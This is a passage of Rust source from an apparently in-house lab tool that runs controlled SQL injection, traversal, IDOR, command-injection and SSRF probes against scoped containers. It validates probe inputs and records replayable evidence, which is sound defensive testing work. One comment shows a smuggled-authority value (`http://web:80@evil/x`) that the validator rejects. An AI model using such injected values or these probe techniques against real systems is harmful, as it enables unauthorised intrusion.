/// and by [`parse_http_witness`], which maps a recorded name back to one of the
/// body-marker techniques above it (the out-of-band `HTTP_SSRF_VANTAGE` below
/// is on its own path and is parsed by `parse_ssrf_witness`), so the name lives in
/// one place rather than being retyped at each site.
pub(crate) const HTTP_SQLI_VANTAGE: &str = "http_sqli_vantage";
pub(crate) const HTTP_PATH_TRAVERSAL_VANTAGE: &str = "http_path_traversal_vantage";
pub(crate) const HTTP_IDOR_VANTAGE: &str = "http_idor_vantage";
pub(crate) const HTTP_CMDI_VANTAGE: &str = "http_cmdi_vantage";
pub(crate) const HTTP_SSTI_VANTAGE: &str = "http_ssti_vantage";
/// SSRF is on its own path, not the body-marker seam: its witness is out-of-band
/// (observed at the canary, #65), not in the probe's response. The string follows
/// the `http_<technique>_vantage` family for the canonical JSON.
pub(crate) const HTTP_SSRF_VANTAGE: &str = "http_ssrf_vantage";
/// Blind OS command injection (#87): the same out-of-band canary witness as SSRF,
/// but the coercion is a command injection at `/exec`, not a URL parameter. The
/// injected command fetches the canary, and the token in the canary's logs is the
/// witness; the probe's own response carries nothing (that is what "blind" means),
/// so this is NOT on the body-marker seam. The in-band command injection (#85) is
/// `HTTP_CMDI_VANTAGE` above; this is its out-of-band twin.
pub(crate) const HTTP_BLIND_CMDI_VANTAGE: &str = "http_blind_cmdi_vantage";

/// Observe whether an HTTP request to `target` from the attacker's vantage returns
/// the `marker` that witnesses the technique succeeded. It is the shared seam under
/// the native HTTP app-security checks whose witness is a `marker` that appears in
/// the probe's OWN response body: a SQL injection whose `marker` is a DB-only
/// value, a path traversal whose `marker` is a file-outside-the-web-root sentinel,
/// and an IDOR whose `marker` is another user's object body (reached by carrying an
/// identity in `request_headers`).
///
/// A technique whose witness is out-of-band does NOT belong on this seam. An SSRF
/// (#65) is confirmed by a canary callback that a separate listener observes; its
/// token never appears in this request's response body, so `classify_http_witness`
/// (which tests `body.contains(marker)`) would read a genuinely vulnerable SSRF
/// target as a confident "not exploitable". Such a technique needs its own witness
/// channel and its own classifier, not this one.
///
/// It runs a busybox `wget` of
/// `http://<target><request_path>` from a container on the `vantage` network and
/// inspects the captured response body for `marker`. `request_path` is the full
/// path and query carrying the payload, already URL-encoded by the caller; it is
/// validated by [`validate_http_request`] before it runs. `capability` is the
/// technique's capability name; it is written into the draft so a replay selects
/// the same technique, while the per-technique cause and remediation stay in the
/// caller's diagnostic (context.rs), not here, so this summary never names one
/// technique.
///
/// Like [`tcp_reachable_from`], the types are the gate: a [`LabNetwork`] is only
/// from `bring_up`, a [`ScopedTarget`] only from the resolver. Because
/// `request_path` must start with `/` (the validation), the authority wget
/// connects to is the `ScopedTarget`'s `host:port`, not something `request_path`
/// smuggled in with an `@` (RK-015). The draft is a first-class vantage record (the
/// capability name, the vantage segment as its `source`) and records the stable
/// segment so a replay can reconstruct it (ADR-0022, #54). The confidence is
/// [`classify_http_witness`]'s: an abnormal probe is `Low`, never a confident "not
/// exploitable".
///
/// busybox `wget` follows HTTP redirects and offers no flag to disable them, so a
/// `target` that answers with a 3xx would have its body read from the redirect's
/// host. `wget -S` prints the response headers to stderr, so
/// [`response_was_redirected`] sees the 3xx status line and [`classify_http_witness`]
/// downgrades the observation to `Low` (Inconclusive): a redirected body is never
/// read as the scoped target's confident answer (#55).
///
/// `request_headers` are added to the probe request, one `--header` each (#64).
/// A technique that acts as a particular identity (IDOR) passes a credential or
/// session header here; SQLi and path traversal pass none. They are validated by
/// [`validate_http_request`] (an RFC 7230 token name, no control bytes in a value)
/// with the rest of the request before the probe, and recorded in the reproduction
/// so a replay re-sends the same identity.
// allow(too_many_arguments): each argument is a distinct probe input (the lab
// handle, the scoped target, the capability tag, the request path, the marker, the
// identity headers, the timeout). This seam is the provisional M1/M2 shape of the
// generalized in-container capability the roadmap reshapes in M3 (mvp.md); a
// probe-inputs struct is the clean refactor at that point, so it is kept flat until
// the M3 shape is known rather than invented now.
#[allow(clippy::too_many_arguments)]
pub(crate) async fn http_witness_exploit_from(
    docker: &Docker,
    vantage: &LabNetwork,
    target: &ScopedTarget,
    capability: &'static str,
    request_path: &str,
    marker: &str,
    request_headers: &[(String, String)],
    timeout: Duration,
) -> Result<(Observation<bool>, EvidenceDraft)> {
    validate_http_request(request_path, marker, request_headers)?;
    let secs = timeout.as_secs().max(1);
    let applied = Duration::from_secs(secs);
    let url = format!("http://{}:{}{}", target.host(), target.port(), request_path);
    let cmd = wget_cmd(&url, secs, request_headers);
    let (state, body, resp_headers) = run_probe_capturing(
        docker,
        vantage.name(),
        cmd,
        applied + Duration::from_secs(5),
    )
    .await?;
    let observation = classify_http_witness(
        &state,
        &body,
        marker,
        response_was_redirected(&resp_headers),
    );
    let spec = format!("{}:{}", target.host(), target.port());
    let draft = http_witness_draft(
        capability,
        vantage.segment(),
        spec,
        request_path,
        marker,
        request_headers,
        &observation,
        applied,
    );
    Ok((observation, draft))
}

/// Validate an HTTP witness probe's inputs before it runs, fail-closed. A crafted
/// `request_path` must not be able to change the authority the request hits: the
/// scope gate is the `ScopedTarget`'s `host:port`, but `request_path` is appended
/// after it, so a value not starting with `/` could carry an `@authority` that
/// wget connects to instead (verified: `wget 'http://web:80@evil/x'` connects to
/// `evil`). Requiring a leading `/` keeps the authority fixed to the resolved
/// target. The `marker` must be non-empty (an empty marker is a substring of every
/// response, so `body.contains("")` would read any 200 as exploited) and must not
/// appear in `request_path` (else a server that reflects the path could forge the
/// witness). CR/LF are refused so the path cannot inject a request line. Pure, so
/// the guard runs without Docker, and it fronts every caller including a replay.
///
/// Each of `headers` (the IDOR identity channel, #64) is validated too. The name
/// must be an RFC 7230 token (non-empty, token characters only): that rejects a
/// `:` that would split it, a CR/LF or any other control that could inject a second
/// header or a request line (the RK-015 injection class on the header channel), and
/// a leading space that a server would read as an obs-fold of the previous header.
/// A value is refused any control character for the same injection reason. The
/// marker is refused in a header name and value, so a server that reflects a header
/// cannot forge the witness.
fn validate_http_request(
    request_path: &str,
    marker: &str,
    headers: &[(String, String)],
) -> Result<()> {
    let invalid = |reason: &str| Error::InvalidTarget {
        spec: request_path.to_owned(),
        reason: reason.to_owned(),
    };
    // `trim().is_empty()` not `is_empty()`: a whitespace-only marker (" ", "\n")
    // is as dangerous as an empty one, since `body.contains(" ")` matches almost
    // any response and would read a benign 200 as exploited. This matches
    // `parse_http_witness`, which already rejects a blank-after-trim marker, so the
    // live and replay entry points agree.
    if marker.trim().is_empty() {
        return Err(invalid(
            "the witness marker must be non-empty and not only whitespace",
        ));
    }
    if !request_path.starts_with('/') {
        return Err(invalid(
            "request_path must start with '/' so it cannot change the request authority",
        ));
    }
    if request_path.contains('\r') || request_path.contains('\n') {
        return Err(invalid("request_path must not contain CR or LF"));
    }
    if request_path.contains(marker) {
        return Err(invalid(
            "the marker must not appear in request_path (a reflected path could forge the witness)",
        ));
    }
    for (name, value) in headers {
        // An RFC 7230 token name (non-empty, token characters only) subsumes the
        // empty/whitespace name, the ':' that would split it, and any CR/LF or other
        // control that could smuggle a second header or a request line; a leading
        // space would be read as an obs-fold of the previous header.
        if name.is_empty() || !name.bytes().all(is_token_char) {
            return Err(invalid(
                "a request header name must be a non-empty RFC 7230 token (letters, digits, and !#$%&'*+-.^_`|~)",
            ));
        }
        // A CR, LF, or any other control byte in a value is the same injection class.
        if value.bytes().any(|b| b < 0x20 || b == 0x7f) {
            return Err(invalid(
                "a request header value must not contain a control character (it could inject another header or a request line)",
            ));
        }
        if name.contains(marker) || value.contains(marker) {
            return Err(invalid(
                "the marker must not appear in a request header (a reflected header could forge the witness)",
            ));
        }
    }
    Ok(())
}

/// Whether `b` is an RFC 7230 `tchar`, a valid HTTP header-name byte: an ASCII
/// letter or digit, or one of the token punctuation characters. Used by
/// [`validate_http_request`] to reject a header name that could be split, folded,
/// or injected.
fn is_token_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b"!#$%&'*+-.^_`|~".contains(&b)
}

/// The busybox `wget` probe as argv (never a shell line): fetch `url` to stdout
/// (`-O -`), quiet (`-q`), print the response headers to stderr (`-S`, so a
/// followed redirect is visible to [`response_was_redirected`], #55), with a
/// `secs` per-read network timeout (`-T`; the total run is bounded by the caller's
/// `max_wait`, not this). `-q` does not suppress `-S` (the Docker-gated redirect
/// test exercises this on real busybox). Passing argv
/// directly rather than through `sh -c` means the url is one argument, not text a
/// shell could interpret, so it cannot inject a command into the probe container.
/// Each of `headers` is added as a `--header` option with its `"name: value"` as a
/// single argument (busybox `wget --header STR`, #64), before the url as busybox
/// expects options first; validated by [`validate_http_request`] so a name is a
/// token and a value carries no control byte. Pure, so the argv shape is
/// unit-tested without Docker.
fn wget_cmd(url: &str, secs: u64, headers: &[(String, String)]) -> Vec<String> {
    let mut cmd = vec![
        "wget".to_owned(),
        "-q".to_owned(),
        "-S".to_owned(),
        "-T".to_owned(),
        secs.to_string(),
        "-O".to_owned(),
        "-".to_owned(),
    ];
    for (name, value) in headers {
        cmd.push("--header".to_owned());
        cmd.push(format!("{name}: {value}"));
    }
    cmd.push(url.to_owned());
    cmd
}

/// Whether the `wget -S` response headers carry a 3xx status line (#55). busybox
/// `wget` prints one status line per response it makes, so a 3xx ahead of the
/// final 200 means it followed a redirect and the body on stdout may be from
/// another host, not the scoped target. Deliberately broad: ANY 3xx counts,
/// including an unfollowed 300 or a same-host redirect whose body is in fact the
/// target's. That over-downgrades such a probe to Inconclusive, which is the safe
/// side (it never reads an unattributable body as a confident answer); narrowing
/// it to a cross-host `Location` comparison, to recover reach against apps that
/// legitimately redirect to themselves, is a deferred refinement. Pure, so it is
/// unit-tested offline against a captured header block; the status line is matched
/// by its code, so header order and the `Location` wording do not matter.
fn response_was_redirected(headers: &str) -> bool {
    headers.lines().any(|line| {
        line.trim_start()
            .strip_prefix("HTTP/")
            .and_then(|rest| rest.split_whitespace().nth(1))
            .is_some_and(|code| code.starts_with('3'))
    })
}

/// Classify a captured HTTP witness probe (see [`http_witness_exploit_from`] for why a followed
/// redirect is untrustworthy). A redirect forces `Low` (value `false`), checked
/// before the exit code because a witnessed marker with a clean exit would
/// otherwise read `High`. Else a clean exit (0) whose body contains the `marker`
/// is an exploit (`true`, `High`); a clean exit whose body lacks it is
/// not-exploitable (`false`, `High`); any other exit code, or an unclean exit, is
/// `Low` (value `false`), because the probe did not establish the endpoint's
/// state and must not read as a confident "not exploitable" (RK-002, CLAUDE.md
/// row 6, under ADR-0010's confidence gate). A redirect and an abnormal probe
/// share that Inconclusive bucket: both downgrade to `Low` rather than erroring
/// like `nc_result`/`classify_probe` (which back the boundary self-check, where
/// an abnormal probe is a lab fault that must refuse the run); here it is a
/// per-test observation that could not conclude, which belongs in Inconclusive
/// under the default-`High` gate, not an `Error`. Taking the state (not a bare
/// code) folds the exited-cleanly check in via [`finished_exit_code`], so the
/// whole fail-closed mapping is unit-tested without Docker.
fn classify_http_witness(
    state: &ContainerState,
    body: &str,
    marker: &str,
    redirected: bool,
) -> Observation<bool> {
    if redirected {
        return Observation {
            value: false,
            confidence: Confidence::Low,
        };
    }
    match finished_exit_code(state) {
        Ok(0) if body.contains(marker) => Observation {
            value: true,
            confidence: Confidence::High,
        },
        Ok(0) => Observation {
            value: false,
            confidence: Confidence::High,
        },
        _ => Observation {
            value: false,
            confidence: Confidence::Low,
        },
    }
}

/// Compose the evidence draft for an HTTP witness vantage probe (parallel to
/// [`vantage_draft`]), for the technique named by `capability`. Pure, so the
/// first-class `source` and the replay witness (the request path, the marker, and
/// the stable segment) are testable without Docker. The request path and marker in
/// the reproduction are what a replay re-runs (ADR-0022, #54); the segment appears
/// in both `source` and the params for the same self-contained-reproduction reason
/// as `vantage_draft`. The `capability` is written into both the draft and its
/// reproduction so a replay reconstructs the right technique. Any
/// `request_headers` (the IDOR identity, #64) go into the reproduction too, so a
/// replay re-sends the same identity; the key is omitted when there are none.
///
/// The `summary` is capability-neutral on purpose: it states only whether the
/// witness `marker` was present, absent, or the probe was inconclusive. The
/// technique-specific wording (that it was a SQL injection, a path traversal, ...)
/// lives in the per-technique ADR-0009 diagnostic (context.rs), so this seam does
/// not have to name every technique and a new one adds no summary branch here.
///
/// The intensity is `Controlled`, not `Safe`: these are Level 2 controlled attack
/// simulations (docs/specs/levels-safety-and-principles.md), not a Level 1 safe
/// check like the `tcp_connect_vantage` reconnaissance probe. The vantage seam runs
/// them without an intensity gate today (it mints no `IntensityCleared`, like
/// `connect_from_vantage`); isolation and scope confine them to the lab regardless,
/// and gating this seam is the deferred M3 work (ADR-0006, context.rs). The honest
/// label is what that future gate will read.
// allow(too_many_arguments): mirrors `http_witness_exploit_from`'s inputs to build
// the draft from them; the same reasoning applies.
#[allow(clippy::too_many_arguments)]
fn http_witness_draft(
    capability: &'static str,
    segment: &str,
    target_spec: String,
    request_path: &str,
    marker: &str,
    request_headers: &[(String, String)],
    observation: &Observation<bool>,
    applied: Duration,
) -> EvidenceDraft {
    // Confidence first, so a `true` value can never pair with a sub-`High`
    // "succeeded" summary (the `true` => `High` invariant lives in
    // `classify_http_witness`; keying off confidence here means the draft cannot
    // contradict it even if a future technique's classifier changes). The negative
    // is scoped to this request: one payload not carrying the marker is not proof
    // the endpoint is universally safe, only that this probe did not exploit it.
    let summary = if observation.confidence != Confidence::High {
        "the probe did not complete cleanly; the result is inconclusive".to_owned()
    } else if observation.value {
        format!("the response carried the marker {marker:?}; the attack succeeded")
    } else {
        format!("the response did not carry the marker {marker:?}; this request did not exploit it")
    };
    EvidenceDraft {
        capability,
        target: target_spec.clone(),
        intensity: Intensity::Controlled,
        observed: serde_json::Value::Bool(observation.value),
        confidence: observation.confidence,
        summary,
        source: Some(NodeRef::Vantage {
            segment: segment.to_owned(),
        }),
        reproduction: Reproduction {
            capability: capability.to_owned(),
            target: target_spec,
            // `request_headers` is added only when non-empty, so a SQLi/traversal
            // witness (which carries none) serializes byte-for-byte as before: the
            // published canonical-JSON shape of those techniques is unchanged
            // (RK-003). A replay reads it back with `parse_http_witness`. The key
            // mirrors the Rust name; a bare `headers` next to `request_path` would
            // read as the response headers, which the code avoids by naming.
            params: {
                let mut params = serde_json::json!({
                    "request_path": request_path,
                    "marker": marker,
                    "vantage_segment": segment,
                    "timeout_ms": applied.as_millis() as u64,
                });
                if !request_headers.is_empty() {
                    params["request_headers"] = serde_json::Value::Array(
                        request_headers
                            .iter()
                            .map(|(name, value)| serde_json::json!([name, value]))
                            .collect(),
                    );
                }
                params
            },
        },
    }
}

/// The env-independent replay inputs parsed from a vantage witness: the segment
/// to probe from, the target, and the applied timeout. Pure and Docker-free, so
/// "a witness missing a field cannot replay" is a guard that runs offline,
/// before [`replay_vantage_probe`] stands a lab up. A missing or ill-typed field
/// is `Error::InvalidTarget`, fail-closed: a witness that cannot be read cannot
/// be replayed, and that is not a silent default (ADR-0022, #29).
fn parse_vantage_witness(witness: &Reproduction) -> Result<(String, String, Duration)> {
    let invalid = |reason: &str| Error::InvalidTarget {
        spec: witness.target.clone(),
        reason: reason.to_owned(),
    };
    if witness.target.is_empty() {
        return Err(invalid("replay witness has an empty target"));
    }
    let segment = witness
        .params
        .get("vantage_segment")
        .and_then(|v| v.as_str())
        // Reject a blank or whitespace-only segment here, so the error blames the
        // witness rather than leaking to `vantage_network` as a weaker
        // "environment has no such segment".
        .filter(|s| !s.trim().is_empty())
        .ok_or_else(|| invalid("replay witness has no vantage_segment"))?;
    let timeout_ms = witness
        .params
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| invalid("replay witness has no timeout_ms"))?;
    Ok((
        segment.to_owned(),
        witness.target.clone(),
        Duration::from_millis(timeout_ms),
    ))
}

/// Replay a vantage probe from its witness against `env`: the first piece of
/// ADR-0022's pinned replay (#29). It reconstructs the exact probe the witness
/// records, brings `env` up fresh, runs it from the recorded vantage segment,
/// and returns the observation, so a caller can check it reproduces the original.
///
/// The witness is parsed before any Docker work, so a witness that cannot be
/// replayed fails closed without standing a lab up. The target is re-resolved
/// through the scope from `env` (so a replay cannot aim outside scope any more
/// than the original could), and the lab is always torn down, mirroring
/// [`run_in_lab`](crate::runner): a teardown failure warns but does not mask the
/// observation.
///
/// The guarantee is narrower than byte-reproducibility: the same observation
/// against the same `Environment`. Image-digest and data-pack pinning (ADR-0019,
/// ADR-0018) are a later milestone, so image drift in `env` is not pinned here.
/// Its only M1 caller is the replay guard; the auto-generation that calls it in
/// a codified regression (ADR-0022, ADR-0015) is deferred.
///
/// Unlike [`run_in_running_lab`](crate::runner), replay deliberately does *not*
/// run [`boundary_self_check`] before probing, even though ADR-0011 gates a test
/// run on it. Replay reproduces one probe's observation; it does not re-certify
/// the lab's boundaries, and it returns the raw `Observation` for a caller to
/// compare, not a verdict. The `High` certification that a declared boundary
/// holds stays with the self-check (ADR-0011), which a real run performs; a
/// replayed observation carries only the probe's own confidence. The probe runs
/// inside the egress-less lab regardless, so skipping the self-check cannot let
/// traffic escape.
// allow(dead_code): no M1 production caller. This is the first piece of
// ADR-0022's pinned replay (#29); the codify step that calls it in a generated
// regression is deferred, and the replay guard exercises it under `cfg(test)`,
// which dead_code does not count.
#[allow(dead_code)]
pub(crate) async fn replay_vantage_probe(
    docker: &Docker,
    env: &Environment,
    witness: &Reproduction,
) -> Result<Observation<bool>> {
    let (segment, target, timeout) = parse_vantage_witness(witness)?;
    let scoped = Scope::from_environment(env).resolve(&target)?;

    let lab = bring_up(docker, env).await?;
    // Find the network, then probe; keep the result so teardown always runs,
    // mirroring run_in_lab (a teardown failure warns, it does not mask the
    // observation).
    let probed = match vantage_network(&lab, &segment) {
        Ok(net) => tcp_reachable_from(docker, net, &scoped, timeout)
            .await
            .map(|(observation, _draft)| observation),
        Err(e) => Err(e),
    };
    if let Err(e) = lab.teardown().await {
        eprintln!("redstep: teardown after a replay also failed: {e}");
    }
    probed
}

/// The env-independent replay inputs parsed from an HTTP witness: the capability,
/// the segment, the target, the request path, the marker, the request headers (the
/// IDOR identity channel, #64), and the applied timeout.
/// Pure and Docker-free (parallel to [`parse_vantage_witness`]), so "a witness
/// missing a field cannot replay" is a guard that runs offline before
/// [`replay_http_witness_probe`] stands a lab up. A missing or ill-typed field is
/// `Error::InvalidTarget`, fail-closed (ADR-0022).
///
/// The witness records its `capability` as a `String`, but the seam takes a
/// `&'static str`; matching the recorded name to a known technique both yields that
/// `&'static str` and fails closed on an unknown one, so a witness naming a
/// capability this build does not have cannot be replayed into the wrong technique.
// allow(type_complexity): the parsed witness is a flat tuple of the probe inputs,
// read positionally straight back into `http_witness_exploit_from`; a named struct
// is the clean refactor for when M3 reshapes this seam (mvp.md), not now.
#[allow(clippy::type_complexity)]
fn parse_http_witness(
    witness: &Reproduction,
) -> Result<(
    &'static str,
    String,
    String,
    String,
    String,
    Vec<(String, String)>,
    Duration,
)> {
    let invalid = |reason: &str| Error::InvalidTarget {
        spec: witness.target.clone(),
        reason: reason.to_owned(),
    };
    if witness.target.is_empty() {
        return Err(invalid("replay witness has an empty target"));
    }
    let capability: &'static str = match witness.capability.as_str() {
        HTTP_SQLI_VANTAGE => HTTP_SQLI_VANTAGE,
        HTTP_PATH_TRAVERSAL_VANTAGE => HTTP_PATH_TRAVERSAL_VANTAGE,
        HTTP_IDOR_VANTAGE => HTTP_IDOR_VANTAGE,
        HTTP_CMDI_VANTAGE => HTTP_CMDI_VANTAGE,
        HTTP_SSTI_VANTAGE => HTTP_SSTI_VANTAGE,
        other => {
            return Err(invalid(&format!(
                "replay witness names an unknown capability {other:?}"
            )));
        }
    };
    let str_param = |key: &str, reason: &'static str| {
        witness
            .params
            .get(key)
            .and_then(|v| v.as_str())
            .filter(|s| !s.trim().is_empty())
            .map(str::to_owned)
            .ok_or_else(|| invalid(reason))
    };
    let segment = str_param("vantage_segment", "replay witness has no vantage_segment")?;
    let request_path = str_param("request_path", "replay witness has no request_path")?;
    let marker = str_param("marker", "replay witness has no marker")?;
    let timeout_ms = witness
        .params
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| invalid("replay witness has no timeout_ms"))?;
    // `request_headers` is optional: a SQLi/traversal witness has no such key and
    // replays with none, so those techniques are unaffected by the identity channel
    // (#64). When present it must be an array of [name, value] string pairs; a
    // malformed one is `InvalidTarget`, fail-closed, not silently dropped.
    let headers = match witness.params.get("request_headers") {
        None => Vec::new(),
        Some(value) => {
            let array = value
                .as_array()
                .ok_or_else(|| invalid("replay witness request_headers is not an array"))?;
            let mut out = Vec::with_capacity(array.len());
            for entry in array {
                let pair = entry.as_array().filter(|p| p.len() == 2).ok_or_else(|| {
                    invalid("a replay witness request header is not a [name, value] pair")
                })?;
                let name = pair[0].as_str().ok_or_else(|| {
                    invalid("a replay witness request header name is not a string")
                })?;
                let hvalue = pair[1].as_str().ok_or_else(|| {
                    invalid("a replay witness request header value is not a string")
                })?;
                out.push((name.to_owned(), hvalue.to_owned()));
            }
            out
        }
    };
    Ok((
        capability,
        segment,
        witness.target.clone(),
        request_path,
        marker,
        headers,
        Duration::from_millis(timeout_ms),
    ))
}

/// Replay an HTTP witness probe from its witness against `env` (ADR-0022, #54, any
/// technique on this seam, not only SQLi), parallel to [`replay_vantage_probe`]:
/// reconstruct the probe the witness records, bring `env` up fresh, re-run it from
/// the recorded vantage segment, and return the raw `Observation` so a caller can
/// check it reproduces the original. The technique is taken from the witness:
/// [`parse_http_witness`] resolves the recorded `capability` to a known one and
/// fails closed on an unknown, so a witness cannot replay into the wrong technique.
/// Running a SQLi witness against an `env` whose api is `redstep/api:mvp` reproduces
/// the exploit (`true`); against `redstep/api:fixed` it observes not-exploitable
/// (`false`), which is the attack-to-defense loop's "the fix holds".
///
/// It shares `replay_vantage_probe`'s shape exactly, and that function carries
/// the reasoning for the parts they have in common: the witness is parsed before
/// any Docker work, the target is re-resolved through
/// `Scope::from_environment(env)` so a replay cannot aim outside scope, the lab
/// is always torn down, and it runs no [`boundary_self_check`] and issues no
/// verdict. What is specific here is that `parse_http_witness` then
/// `validate_http_request` re-check the witnessed `request_path`, `marker`, and
/// request headers, so an untrusted witness cannot smuggle an authority through the
/// appended request component or an injected header (RK-015), which a vantage
/// witness has no equivalent of. The
/// guarantee is the same observation against the same `Environment`, not
/// byte-reproducibility; image pinning (ADR-0019) is deferred, so the mvp/fixed
/// distinction is `env`'s choice.
// allow(dead_code): no M1 production caller. Like `replay_vantage_probe`, the
// codify step that calls it in a generated regression (ADR-0022, ADR-0015) is
// deferred; the loop guard exercises it under `cfg(test)`.
#[allow(dead_code)]
pub(crate) async fn replay_http_witness_probe(
    docker: &Docker,
    env: &Environment,
    witness: &Reproduction,
) -> Result<Observation<bool>> {
    let (capability, segment, target, request_path, marker, headers, timeout) =
        parse_http_witness(witness)?;
    let scoped = Scope::from_environment(env).resolve(&target)?;

    let lab = bring_up(docker, env).await?;
    let probed = match vantage_network(&lab, &segment) {
        Ok(net) => http_witness_exploit_from(
            docker,
            net,
            &scoped,
            capability,
            &request_path,
            &marker,
            &headers,
            timeout,
        )
        .await
        .map(|(observation, _draft)| observation),
        Err(e) => Err(e),
    };
    if let Err(e) = lab.teardown().await {
        eprintln!("redstep: teardown after a replay also failed: {e}");
    }
    probed
}

/// Classify a captured SSRF probe by whether the coerced target reached the canary.
/// The witness is OUT-OF-BAND: `seen` is whether the per-probe token appeared in
/// the canary's logs, not anything in the probe's own response. A clean probe exit
/// (0) with the token seen is an exploit (`true`/`High`); a clean exit with the
/// token absent is not-exploitable (`false`/`High`); any other exit code, or an
/// unclean exit (so the coercion itself did not complete), is `Low` (value
/// `false`), because the probe did not establish the target's behaviour and must
/// not read as a confident "not exploitable" (RK-002, ADR-0010). A followed
/// redirect forces `Low` first (before the exit code): busybox `wget` exits 0 on a
/// followed 3xx, but the redirect may have taken the probe somewhere other than the
/// app's `/fetch`, so the coercion may never have fired and a token-absent result
/// is not a confident "not exploitable" (the same hazard `classify_http_witness`
/// guards for the body seam, #55). Pure given the inputs, so the mapping is
/// unit-tested without Docker.
fn classify_ssrf(state: &ContainerState, seen: bool, redirected: bool) -> Observation<bool> {
    if redirected {
        return Observation {
            value: false,
            confidence: Confidence::Low,
        };
    }
    match finished_exit_code(state) {
        Ok(0) if seen => Observation {
            value: true,
            confidence: Confidence::High,
        },
        Ok(0) => Observation {
            value: false,
            confidence: Confidence::High,
        },
        _ => Observation {
            value: false,
            confidence: Confidence::Low,
        },
    }
}

/// Compose the evidence draft for an SSRF vantage probe. The `target` is the
/// coerced app (the scoped target), NOT the canary: the canary is only the
/// observation point, so the finding is attributed to the app and the canary
/// lives solely in the reproduction params (#65, ADR-0023). Confidence-first
/// summary, like `http_witness_draft`, so a `true` can never read sub-`High`. The
/// reproduction records the coercion path, the token, and the canary identity so a
/// replay reconstructs the probe.
// allow(too_many_arguments): each argument is a distinct draft input (the segment,
// the target spec, the coercion path, the token, the canary alias and port, the
// observation, the timing). Parallel to `http_witness_draft`, it is kept flat until
// the M3 probe-inputs reshape (mvp.md) rather than grouped into a struct now.
#[allow(clippy::too_many_arguments)]
fn ssrf_draft(
    segment: &str,
    target_spec: String,
    request_path: &str,
    token: &str,
    canary_alias: &str,
    canary_port: u16,
    observation: &Observation<bool>,
    applied: Duration,
) -> EvidenceDraft {
    let summary = if observation.confidence != Confidence::High {
        "the probe did not complete cleanly; the result is inconclusive".to_owned()
    } else if observation.value {
        format!("the target reached the canary with token {token:?}; the SSRF succeeded")
    } else {
        "the target did not reach the canary; this coercion did not exploit it".to_owned()
    };
    EvidenceDraft {
        capability: HTTP_SSRF_VANTAGE,
        target: target_spec.clone(),
        intensity: Intensity::Controlled,
        observed: serde_json::Value::Bool(observation.value),
        confidence: observation.confidence,
        summary,
        source: Some(NodeRef::Vantage {
            segment: segment.to_owned(),
        }),
        reproduction: Reproduction {
            capability: HTTP_SSRF_VANTAGE.to_owned(),
            target: target_spec,
            params: serde_json::json!({
                "request_path": request_path,
                "token": token,
                "canary_alias": canary_alias,
                "canary_port": canary_port,
                "vantage_segment": segment,
                "timeout_ms": applied.as_millis() as u64,
            }),
        },
    }
}

/// The env-independent replay inputs parsed from an SSRF witness: the segment, the
/// target (the app), the coercion request path, the token, the canary alias and
/// port, and the applied timeout. Pure and Docker-free (parallel to
/// `parse_http_witness`), fail-closed on a missing/ill-typed field (ADR-0022).
// allow(type_complexity): the parsed replay inputs are a flat tuple parallel to
// `parse_http_witness`; a named struct is the same M3 reshape (mvp.md), not now.
#[allow(clippy::type_complexity)]
fn parse_ssrf_witness(
    witness: &Reproduction,
) -> Result<(String, String, String, String, String, u16, Duration)> {
    let invalid = |reason: &str| Error::InvalidTarget {
        spec: witness.target.clone(),
        reason: reason.to_owned(),
    };
    if witness.target.is_empty() {
        return Err(invalid("replay witness has an empty target"));
    }
    if witness.capability != HTTP_SSRF_VANTAGE {
        return Err(invalid("replay witness is not an SSRF witness"));
    }
    let str_param = |key: &str, reason: &'static str| {
        witness
            .params
            .get(key)
            .and_then(|v| v.as_str())
            .filter(|s| !s.trim().is_empty())
            .map(str::to_owned)
            .ok_or_else(|| invalid(reason))
    };
    let segment = str_param("vantage_segment", "replay witness has no vantage_segment")?;
    let request_path = str_param("request_path", "replay witness has no request_path")?;
    let token = str_param("token", "replay witness has no token")?;
    let canary_alias = str_param("canary_alias", "replay witness has no canary_alias")?;
    let canary_port = witness
        .params
        .get("canary_port")
        .and_then(|v| v.as_u64())
        .filter(|p| *p <= u16::MAX as u64)
        .ok_or_else(|| invalid("replay witness has no canary_port"))? as u16;
    let timeout_ms = witness
        .params
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| invalid("replay witness has no timeout_ms"))?;
    Ok((
        segment,
        witness.target.clone(),
        request_path,
        token,
        canary_alias,
        canary_port,
        Duration::from_millis(timeout_ms),
    ))
}

/// The canary-log poll window for an out-of-band SSRF witness. The app's fetch is
/// synchronous, but stdout -> Docker-log propagation can lag, so a single read
/// could miss a just-arrived hit and read a confident false-negative (a false PASS,
/// CLAUDE.md row 6). Ten reads at 200 ms (about 2 s) covers the propagation lag
/// seen against the playground canary with margin; a token still absent after the
/// window is a genuine not-reached. This bound is where "absent" becomes a
/// confident High `false`, so it is named rather than inlined.
const SSRF_CANARY_POLL_ATTEMPTS: usize = 10;
const SSRF_CANARY_POLL_INTERVAL: Duration = Duration::from_millis(200);

/// Coerce `app` (the SSRF target) from the attacker vantage to fetch
/// `http://{canary_alias}:{canary_port}/{token}` server-side, then witness the
/// request OUT-OF-BAND in the canary's container logs, NOT in the app's own
/// response (the app returns only the fetched status). `token` is minted fresh per
/// probe and is not known outside this run, and the only request carrying it that
/// this check issues is the coercion at `app`, so a `token` seen in the canary's
/// log means `app` reached the canary. Layer-1 isolation (ADR-0006) confines that
/// fetch to the egress-less lab: nothing outside the lab can reach the canary, and
/// within the lab the check sends the token to no host but `app`. The token is not
/// a secret (anything on the lab that learned it could reach the canary too), which
/// is why a replay re-derives the coercion path rather than trusting the recorded
/// one. The marker-in-path forgery guard does NOT apply here: `token` legitimately
/// appears in the request path (it is the coercion target), and the witness is at
/// the canary, not the body. The draft's `target` is `app`, not the canary (#65,
/// ADR-0023). This is a separate path from `http_witness_exploit_from`: that seam's
/// `classify_http_witness` reads the probe's own body, and an SSRF witness is not
/// there.
// allow(too_many_arguments): each argument is a distinct probe input (the Docker
// handle, the vantage network, the scoped target, the canary alias/port/container,
// the token, the timeout). Parallel to `http_witness_exploit_from`, it is the
// provisional seam kept flat until the M3 probe-inputs reshape (mvp.md).
#[allow(clippy::too_many_arguments)]
pub(crate) async fn ssrf_exploit_from(
    docker: &Docker,
    vantage: &LabNetwork,
    app: &ScopedTarget,
    canary_alias: &str,
    canary_port: u16,
    canary_container: &str,
    token: &str,
    timeout: Duration,
